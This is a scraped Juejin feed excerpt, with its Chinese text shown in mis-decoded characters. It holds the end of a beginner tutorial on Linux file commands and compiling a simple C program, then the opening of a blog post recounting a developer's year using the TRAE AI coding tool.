<h4 data-id="heading-16">ï¼ˆ3ï¼‰è¿è¡Œç¨‹åº</h4>
<p>ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶åï¼Œé€šè¿‡ â€œ<code>./å¯æ‰§è¡Œæ–‡ä»¶å</code>â€ è¿è¡Œï¼š</p>
<p>bash</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. é»˜è®¤ç¼–è¯‘åè¿è¡Œ</span>
./a.out
<span class="hljs-comment"># 2. è‡ªå®šä¹‰ç¼–è¯‘åè¿è¡Œï¼ˆæ¨èï¼‰</span>
./info
<span class="hljs-comment"># è¿è¡Œç»“æœï¼ˆç¤ºä¾‹ï¼‰ï¼š</span>
<span class="hljs-comment"># å§“åï¼šå¼ ä¸‰</span>
<span class="hljs-comment"># ä¸“ä¸šï¼šè®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯</span>
<span class="hljs-comment"># å­¦æ ¡ï¼šXXå¤§å­¦</span>
</code></pre>
<h3 data-id="heading-17">3. å¸¸è§é”™è¯¯ä¸æ’æŸ¥</h3>

























<table><thead><tr><th>é”™è¯¯ç±»å‹</th><th>é”™è¯¯æç¤º</th><th>åŸå› ä¸è§£å†³</th></tr></thead><tbody><tr><td>ä¸»å‡½æ•°é”™è¯¯</td><td><code>undefined reference to 'main'</code></td><td>åŸå› ï¼š<code>main</code>å‡½æ•°æ‹¼å†™é”™è¯¯ï¼ˆå¦‚<code>mian</code>ã€<code>Main</code>ï¼‰ï¼›è§£å†³ï¼šæ£€æŸ¥å¹¶ä¿®æ­£ä¸º<code>int main()</code></td></tr><tr><td>ç¬¦å·é”™è¯¯</td><td><code>error: stray '\357' in program</code></td><td>åŸå› ï¼šä½¿ç”¨ä¸­æ–‡ç¬¦å·ï¼ˆå¦‚ä¸­æ–‡åˆ†å·ã€å¼•å·ï¼‰ï¼›è§£å†³ï¼šå°†æ‰€æœ‰ç¬¦å·æ›¿æ¢ä¸ºè‹±æ–‡ç¬¦å·ï¼Œæ¨èåœ¨ç¼–è¾‘å™¨ä¸­å¼€å¯ â€œæ˜¾ç¤ºæ‰€æœ‰å­—ç¬¦â€ åŠŸèƒ½æ£€æŸ¥</td></tr><tr><td>å¤´æ–‡ä»¶ç¼ºå¤±</td><td><code>fatal error: stdio.h: No such file or directory</code></td><td>åŸå› ï¼šæœªåŒ…å«<code>#include &lt;stdio.h&gt;</code>ï¼ˆä½¿ç”¨<code>printf</code>ç­‰å‡½æ•°å¿…éœ€ï¼‰ï¼›è§£å†³ï¼šåœ¨ä»£ç å¼€å¤´æ·»åŠ é¢„å¤„ç†å‘½ä»¤<code>#include &lt;stdio.h&gt;</code></td></tr></tbody></table>
<h2 data-id="heading-18">å››ã€å®æˆ˜ä½œä¸šï¼šç»¼åˆåº”ç”¨æŒ‡ä»¤ä¸å¼€å‘</h2>
<p>é€šè¿‡ä»¥ä¸‹ä½œä¸šå·©å›ºæ‰€å­¦å†…å®¹ï¼Œå»ºè®®å®é™…æ“ä½œå¹¶éªŒè¯ç»“æœï¼š</p>
<h3 data-id="heading-19">1. æŒ‡ä»¤ç»¼åˆä½œä¸šï¼šç›®å½•ä¸æ–‡ä»¶æ“ä½œ</h3>
<p>éœ€æ±‚ï¼šåœ¨ä¸»ç›®å½•åˆ›å»º<code>test</code>ç›®å½•ï¼Œå®Œæˆä¸€ç³»åˆ—æ–‡ä»¶æ“ä½œï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p>bash</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. è¿›å…¥ä¸»ç›®å½•ï¼ˆå¯çœç•¥ï¼Œç»ˆç«¯é»˜è®¤åœ¨ä¸»ç›®å½•ï¼‰</span>
<span class="hljs-built_in">cd</span> ~
<span class="hljs-comment"># 2. åˆ›å»ºtestç›®å½•</span>
<span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span>
<span class="hljs-comment"># 3. è¿›å…¥testç›®å½•</span>
<span class="hljs-built_in">cd</span> <span class="hljs-built_in">test</span>
<span class="hljs-comment"># 4. åˆ›å»º1.cæ–‡ä»¶ï¼ˆç©ºæ–‡ä»¶ï¼‰</span>
<span class="hljs-built_in">touch</span> 1.c
<span class="hljs-comment"># 5. å¤åˆ¶1.cä¸º2.c</span>
<span class="hljs-built_in">cp</span> 1.c 2.c
<span class="hljs-comment"># 6. å°†2.cé‡å‘½åä¸º3.c</span>
<span class="hljs-built_in">mv</span> 2.c 3.c
<span class="hljs-comment"># 7. åˆ é™¤1.cæ–‡ä»¶</span>
<span class="hljs-built_in">rm</span> 1.c
<span class="hljs-comment"># 8. è¿”å›ä¸»ç›®å½•ï¼Œå°†testç›®å½•å‹ç¼©ä¸ºtest.gz</span>
<span class="hljs-built_in">cd</span> ~
tar -zcvf test.gz <span class="hljs-built_in">test</span>
<span class="hljs-comment"># éªŒè¯ï¼šä¸»ç›®å½•ä¸‹å‡ºç°test.gzæ–‡ä»¶ï¼Œtestç›®å½•ä»å­˜åœ¨ï¼ˆå‹ç¼©ä¸åˆ é™¤åŸç›®å½•ï¼‰</span>
<span class="hljs-built_in">ls</span>
</code></pre>
<h3 data-id="heading-20">2. C è¯­è¨€å¼€å‘ä½œä¸šï¼šæ‰“å°ä¸ªäººä¿¡æ¯</h3>
<p>éœ€æ±‚ï¼šç¼–å†™ C è¯­è¨€ç¨‹åº<code>myinfo.c</code>ï¼Œæ‰“å°å§“åã€ä¸“ä¸šã€å­¦æ ¡ã€è”ç³»æ–¹å¼ï¼Œç¼–è¯‘å¹¶è¿è¡Œã€‚</p>
<p>c</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"================ ä¸ªäººä¿¡æ¯ ================\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å§“åï¼šæå››\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ä¸“ä¸šï¼šè½¯ä»¶å·¥ç¨‹\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å­¦æ ¡ï¼šYYå¤§å­¦\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"è”ç³»æ–¹å¼ï¼š12345678901\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"==========================================\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>ç¼–è¯‘ä¸è¿è¡Œï¼š</p>
<p>bash</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-bash" lang="bash">gcc myinfo.c -o myinfo
./myinfo
</code></pre>
<h2 data-id="heading-21">äº”ã€å­¦ä¹ å»ºè®®ï¼šä»å…¥é—¨åˆ°ç†Ÿç»ƒ</h2>
<ol>
<li><strong>å¤šç»ƒå¤šè¯•</strong>ï¼šLinux æŒ‡ä»¤æŒæ¡æ— æ·å¾„ï¼Œå»ºè®®æ¯å­¦ä¸€ä¸ªæŒ‡ä»¤ï¼Œç«‹å³åœ¨ç»ˆç«¯å®æ“ï¼Œå°è¯•ä¸åŒé€‰é¡¹ï¼ˆå¦‚<code>ls -l</code>ã€<code>ls -la</code>ï¼‰ï¼Œè§‚å¯Ÿè¾“å‡ºå·®å¼‚ã€‚</li>
<li><strong>è®°å½•ç¬”è®°</strong>ï¼šç”¨ Xmind æ¢³ç†æŒ‡ä»¤é€»è¾‘ï¼ˆå¦‚ â€œæ–‡ä»¶æ“ä½œæŒ‡ä»¤â€ åŒ…å«<code>touch</code>ã€<code>cp</code>ã€<code>mv</code>ç­‰ï¼‰ï¼Œæˆ–è®°å½•å¸¸è§é”™è¯¯ä¸è§£å†³æ–¹æ³•ï¼Œé¿å…é‡å¤è¸©å‘ã€‚</li>
<li><strong>æ‹“å±•å­¦ä¹ </strong>ï¼šæœ¬æ–‡è¦†ç›–åŸºç¡€å†…å®¹ï¼Œåç»­å¯å­¦ä¹ è¿›é˜¶æŒ‡ä»¤ï¼ˆå¦‚<code>grep</code>æ–‡æœ¬æœç´¢ã€<code>ps</code>è¿›ç¨‹ç®¡ç†ã€<code>ssh</code>è¿œç¨‹ç™»å½•ï¼‰ï¼Œç»“åˆå®é™…åœºæ™¯ï¼ˆå¦‚æœåŠ¡å™¨éƒ¨ç½²ã€åµŒå…¥å¼å¼€å‘ï¼‰æ·±åŒ–åº”ç”¨ã€‚</li>
</ol>
<p>é€šè¿‡æœ¬æ–‡çš„å­¦ä¹ ä¸å®æˆ˜ï¼Œç›¸ä¿¡èƒ½å¿«é€ŸæŒæ¡ Linux åŸºç¡€æ“ä½œä¸ C è¯­è¨€å¼€å‘æµç¨‹ï¼Œä¸ºåç»­æŠ€æœ¯è¿›é˜¶æ‰“ä¸‹åšå®åŸºç¡€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025ï¼ŒAI ç¼–ç¨‹å…ƒå¹´ï¼Œæˆ‘ç”¨ TRAE åšäº†è¿™äº›ï¼Œå¹¶ä¸”è·å¾—TRAEå¹´åº¦åˆ›ä½œä¹‹æ˜Ÿï¼]]></title>    <link>https://juejin.cn/post/7588376012120686619</link>    <guid>https://juejin.cn/post/7588376012120686619</guid>    <pubDate>2025-12-28T11:20:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588376012120686619" data-draft-id="7588109656042029102" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025ï¼ŒAI ç¼–ç¨‹å…ƒå¹´ï¼Œæˆ‘ç”¨ TRAE åšäº†è¿™äº›ï¼Œå¹¶ä¸”è·å¾—TRAEå¹´åº¦åˆ›ä½œä¹‹æ˜Ÿï¼"/> <meta itemprop="keywords" content="Trae,å‰ç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-28T11:20:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸å¦‚æ‘¸é±¼å»"/> <meta itemprop="url" content="https://juejin.cn/user/26044011388510"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025ï¼ŒAI ç¼–ç¨‹å…ƒå¹´ï¼Œæˆ‘ç”¨ TRAE åšäº†è¿™äº›ï¼Œå¹¶ä¸”è·å¾—TRAEå¹´åº¦åˆ›ä½œä¹‹æ˜Ÿï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/26044011388510/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸å¦‚æ‘¸é±¼å»
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T11:20:07.000Z" title="Sun Dec 28 2025 11:20:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    388
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37f4978cd108417ca631c0963fb42d6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=mYaBU%2Byu2kUhdnC3Y0NPj05tveU%3D" alt="" loading="lazy"/></p>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ä¸å¦‚æ‘¸é±¼å»ï¼Œæ¬¢è¿æ¥åˆ°æˆ‘çš„åˆ†äº«ä¸“æ ã€‚</p>
<p>2025 å·²ç»åˆ°äº†å°¾å£°ï¼Œç”±äºæœ€è¿‘åœ¨å®¶å…»ç—…ï¼Œæ—©æ—©å†™å¥½äº† <a href="https://juejin.cn/post/7588022226738888754" target="_blank" title="https://juejin.cn/post/7588022226738888754">ä¸å¦‚æ‘¸é±¼å»çš„ 2025 å¹´ç»ˆæ€»ç»“ï¼Œä»Šå¹´çš„å…³é”®è¯æ˜¯ç›´é¢å¤©å‘½</a>ï¼Œè®°å½•å¹¶æ€»ç»“ä¸€ä¸‹ 2025 çš„ç»å†ä¸æ”¶è·ã€‚</p>
<p>ä»Šå¹´æ˜¯ AI ç¼–ç¨‹å…ƒå¹´ï¼Œä¹Ÿæ˜¯AI ç¼–ç¨‹å·¥å…·å¤§çˆ†å‘çš„ä¸€å¹´ï¼Œæˆ‘è§‰å¾—è¿˜æ˜¯æœ‰å¿…è¦å•å¼€ä¸€ç¯‡æ€»ç»“ä¸‹ä¸€æ•´å¹´çš„ AI ç¼–ç¨‹çš„å®è·µä¸æ”¶è·ï¼ŒèŠä¸€èŠ 2025 AI/Vibe Coding å¯¹æˆ‘çš„å½±å“ã€‚</p>
<p>è¿™ä¸€å¹´å…‰æˆ‘ç”¨è¿‡çš„å·¥å…·å°±æœ‰ GitHub Copilotã€Cursorã€Traeã€Qoderã€Codebuddyã€Kiroã€Claude Codeã€Catpawã€Antigravity ç­‰ç­‰ã€‚æœ€æ—©æ˜¯åœ¨ç”¨ GitHub Copilotï¼Œç„¶åæ˜¯ Cursorï¼ˆæ”¯ä»˜æ–¹å¼æ¯”è¾ƒå‹å¥½ï¼‰ï¼Œå†åæ¥å›½äº§ AI ç¼–ç¨‹å·¥å…· TRAEã€Codebuddyã€Qoder é™†ç»­å‘å¸ƒï¼Œæ¯ä¸ªæ–°çš„å·¥å…·åŸºæœ¬éƒ½æœ‰åœ¨ç”¨ã€‚</p>
<p>è‡ªä» Cursor é”åŒºï¼ŒTRAEå°±æˆä¸ºäº†æˆ‘çš„ä¸»åŠ› AI ç¼–ç¨‹å·¥å…·ï¼Œæ‰€ä»¥ä»Šå¤©å°±ä¸»è¦èŠä¸€èŠæˆ‘ä½¿ç”¨ TRAE çš„å¿ƒè·¯å†ç¨‹ã€‚</p>
<h2 data-id="heading-0">æˆ‘åœ¨ç”¨ AI åšä»€ä¹ˆï¼Ÿ</h2>
<p>AI å·²ç»å®Œç¾èå…¥åˆ°äº†å¾ˆå¤šäººçš„ç”Ÿæ´»ä¸­ï¼Œä»¥å‰æ˜¯ç™¾åº¦ä¸€ä¸‹ã€è°·æ­Œä¸€ä¸‹ï¼Œç°åœ¨å˜æˆäº† AI ä¸€ä¸‹ã€‚ä»Šå¹´æˆ‘ä¸»è¦æ˜¯ç”¨æ¥åšä»¥ä¸‹äº‹æƒ…ï¼š</p>
<ul>
<li>æˆ‘çš„ä¸»ä¸šï¼šç¼–ç¨‹æ¬ç –ï¼Œå¤§å¤šæ•°ç¨‹åºå‘˜ç°åœ¨éƒ½å·²ç»æ˜¯ Vibe Coding æˆ–è€… SDD ç¼–ç¨‹äº†ï¼Œå·¥ä½œå·²ç»ç¦»ä¸å¼€ AI äº†ã€‚</li>
<li>å†™æ–‡ç« ï¼šå¹³æ—¶å†™å†™æ–‡ç« ï¼Œæœ‰çš„äº‹æƒ…ä¼šäº¤ç»™ AIã€‚ä¸è¿‡å…¨æ–‡ AI ç¼–å†™çš„è¯ï¼ŒAI å‘³å„¿éå¸¸å¤§ï¼Œæ‰€ä»¥æˆ‘ç›®å‰ä¸»è¦æ˜¯æ‹¿æ¥å†™æ‘˜è¦ã€ç”Ÿæˆæ ‡é¢˜å»ºè®®ã€ç”Ÿæˆå°é¢æç¤ºè¯ç­‰ã€‚</li>
<li>ç”Ÿæˆå›¾ç‰‡ï¼šåˆ¶ä½œæ–‡ç« å°é¢ã€åˆ¶ä½œæ‰‹ç»˜å›¾æ¼«ç”»ä¹‹ç±»çš„ã€ç”Ÿæˆæ¸¸æˆåˆ†é•œç­‰ç­‰ã€‚</li>
<li>æŸ¥è¯¢çŸ¥è¯†ï¼šè¿™ä¸ªåº”è¯¥æ˜¯å¤§å¤šæ•°äººéƒ½ä¼šç”¨çš„ï¼Œä¾‹å¦‚è±†åŒ…ã€DeepSeekã€Kimiä¹‹ç±»çš„åº”ç”¨ï¼Œåˆ¶ä½œæ—…è¡Œæ”»ç•¥ã€æŸ¥è¯¢å°±åŒ»çœ‹ç—…çŸ¥è¯†ã€è§£è¯»ç—…ç†ã€æ£€æŸ¥æŠ¥å‘Šç­‰ç­‰ã€‚</li>
<li>å¼€æºï¼šæˆ‘åœ¨å¼€æºé¡¹ç›®ä¸­ä½¿ç”¨ AI è¿›è¡Œ reviewï¼Œä½¿ç”¨ AI å¯¹ä»£ç è¿›è¡Œé‡æ„ï¼Œä¹Ÿä¼šä½¿ç”¨ AI è¿›è¡ŒåŠŸèƒ½ç¼–ç å’Œ bug ä¿®å¤ï¼Œè¿˜ä¼šä½¿ç”¨ AI åšä¸€äº›æ„Ÿå…´è¶£çš„å°ä¸œè¥¿ã€‚</li>
</ul>
<p>å¤§å®¶éƒ½åœ¨ç”¨ AI åšä»€ä¹ˆå‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">TRAE åˆä»£çš„ä½¿ç”¨</h2>
<p>å®è¯è¯´ï¼Œåˆä»£ TRAE æ˜¯ç›¸å½“çš„è¹©è„šï¼Œé‚£æ—¶å€™çš„ TRAE è¿˜æ˜¯çº¢è‰²çš„å›¾æ ‡ï¼Œå¯¹æ¯” Cursor å’Œ GitHub Copilot ç¡®å®ä¸èƒ½æ‰“ã€‚ä¸è¿‡æ²¡å…³ç³»ï¼Œå…ˆå¿ä¸€å¿ï¼Œæ¯•ç«Ÿå½“æ—¶æ˜¯å…è´¹çš„claude-3.5ï¼Œè¿˜è¦å•¥è‡ªè¡Œè½¦å‘¢ğŸ¶ï¼Ÿç„¶åå°±æœ‰äº†è¿™ç¯‡æ–‡ç« <a href="https://juejin.cn/post/7474019962718732314" target="_blank" title="https://juejin.cn/post/7474019962718732314">ã€Šä»é›¶åˆ°ä¸€ï¼šç”¨Traeå¿«é€Ÿæ­å»ºuni-app AIå¯¹è¯å°ç¨‹åºé¡µé¢ã€‹</a>ã€‚</p>
<p>å½“æ—¶å‡†å¤‡åšä¸€ä¸ªæµå¼å“åº” AIå¯¹è¯å°ç¨‹åºï¼Œè€Œåˆšå‘å¸ƒçš„ TRAE æ­£å¥½æä¾›äº†å…è´¹çš„ claude-3.5 æ¨¡å‹ä½¿ç”¨ï¼Œäºæ˜¯ç”¨ TRAE åŸºäº uni-app å’Œ wot-starter åˆ¶ä½œäº†è¿™ä¹ˆä¸€ä¸ªç®€å•çš„å¯¹è¯ demoã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf1babb291c744d3be06fb2462f17387~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=8cc2nZxUKalLL6Zut12nxfKSRCA%3D" alt="" loading="lazy"/></p>
<p>ä½“éªŒä¸‹æ¥èƒ½ç”¨ï¼Œä½†æ˜¯å½“æ—¶å®åŠ›å¯¹æ¯” cursor ç¡®å®æœ‰æ‰€å·®è·ï¼Œè€Œä¸”è¿˜éœ€è¦æ’é˜Ÿï¼Œä¸è¿‡æ¯•ç«Ÿæ˜¯å…è´¹çš„claude-3.5ï¼Œè¿˜è¦å•¥è‡ªè¡Œè½¦å‘¢ï¼Œå¦‚æœå®ƒæ”¶è´¹æˆ‘å¯ä»¥è¯´æ˜¯å®ƒæœ‰é—®é¢˜ï¼Œè€Œç°åœ¨åªèƒ½è¯´æ˜¯æˆ‘ä¸ä¼šé—®ğŸ¶ã€‚</p>
<h2 data-id="heading-2">TRAE SOLO</h2>
<p>7 æœˆ 21 æ—¥ï¼ŒTRAE SOLO å‘å¸ƒï¼Œå®ƒå¸¦æ¥äº†ç”±AIä¸»å¯¼å¼€å‘ï¼Œä»è¾“å…¥åˆ°äº¤ä»˜çš„å…¨é“¾è·¯ååŒçš„å¼€å‘æ¨¡å¼ï¼Œè€Œæˆ‘ä¹Ÿæˆä¸ºäº†ç¬¬ä¸€æ‰¹ TRAE SOLO ç”¨æˆ·ï¼Œå¹¶ä¸”ä½¿ç”¨ TRAE SOLO å¤åˆ»äº†ç«¥å¹´å¦å…‹å¤§æˆ˜ï¼Œå®è·µäº†å…¨ AI è¾…åŠ©å¼€å‘å°ç¨‹åºçš„ææ•ˆå®è·µã€‚</p>
<h3 data-id="heading-3">å¤åˆ»ç«¥å¹´å°æ¸¸æˆ</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46fad217569f45a18ded969fe25a3572~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=TmU8Up93ERwwkvS9nxdmxLsfNVE%3D" alt="" loading="lazy"/></p>
<p><a href="https://juejin.cn/post/7533434265414189091" target="_blank" title="https://juejin.cn/post/7533434265414189091">ã€Šå½“å¹´å·å·ç©å°éœ¸ç‹ï¼Œç°åœ¨å·å·ç”¨ Trae Solo å¤åˆ»å¦å…‹å¤§æˆ˜ã€‹</a>ä¸€æ–‡ä¸­ï¼Œæˆ‘ä½¿ç”¨ TRAE SOLO å¤åˆ»äº†ç«¥å¹´å¦å…‹å¤§æˆ˜ã€‚</p>
<p>å‡­å€Ÿæ­¤ç¯‡æ–‡ç« ï¼Œæˆ‘è·å¾—äº† TRAE å¤´å·ç©å®¶æ´»åŠ¨çš„äºŒç­‰å¥–ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92d2d7b14f2f41b98a3f35d1077d1506~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=5Ynd3bpm1BJgdpyeUXXuinUPgxg%3D" alt="" loading="lazy"/></p>
<p>åŒæ—¶ï¼Œæ–‡ç« ä¹Ÿè¢«æ”¶å½•åˆ° TRAE å…¬ä¼—å·çš„æœ€ä½³å®è·µæ–‡ç« ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/efa9a407471b4176bc36e0bea536fcc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596618&amp;x-signature=TWZsfzUBVorHTnfguRzyG8YC6EQ%3D" alt="" loading="lazy"/></p>
<p>æ¬²ä¹°æ¡‚èŠ±åŒè½½é…’ï¼Œç»ˆä¸ä¼¼å°‘å¹´æ¸¸ï¼Œå°±ç®—å¤åˆ»å¾—å†åƒï¼Œä¹Ÿæ— æ³•å†å›åˆ°ä»å‰ï¼Œä½† AI ç”¨æ–°çš„å·¥å…·é“¾æŠŠæ—§æ—¥çš„å¿«ä¹ä»è®°å¿†ä¸­å”¤é†’ï¼Œè®©æˆ‘ä»¬ä¸ç«¥å¹´è·¨è¶Šæ—¶ç©ºçš„äº¤æµï¼Œä¹Ÿæ˜¯ä¸€æ¬¡éå¸¸é…·çš„ä½“éªŒï¼</p>
<h3 data-id="heading-4">AI è¾…åŠ©å¼€å‘å°ç¨‹åº</h3>
